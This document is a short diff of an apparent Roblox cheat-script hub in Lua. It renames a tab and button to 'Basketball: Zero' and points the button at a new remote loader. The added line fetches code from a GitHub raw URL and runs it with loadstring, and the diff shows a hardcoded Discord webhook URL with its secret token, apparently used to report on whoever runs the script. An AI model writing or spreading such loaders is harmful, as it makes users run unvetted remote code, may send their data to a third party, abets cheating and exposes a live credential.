@@ -234,12 +234,12 @@ http_request({
     end,
  })
 
-local Tab = Window:CreateTab("MVSD", 4483362458) -- Title, Image
+local Tab = Window:CreateTab("Basketball: Zero", 4483362458) -- Title, Image
 
  local Button = Tab:CreateButton({
-    Name = "Load MVSD Script",
+    Name = "Load Basktball Zero Script",
     Callback = function()
-        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0b95dcc32ec7f86e0e326d4c8f25ba6c.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fratelevostru9999/src/refs/heads/main/sazurn/basketballzero",true))()
         local HttpService = game:GetService("HttpService")
 local Webhook_URL = "https://discord.com/api/webhooks/1356772670040969368/KSPlP9tAvg-32DP8_JvBjJpmShjS3J9-nwq26dQSCkdw9ePT9C5QhQKacqA7Uq3_0xds"
  
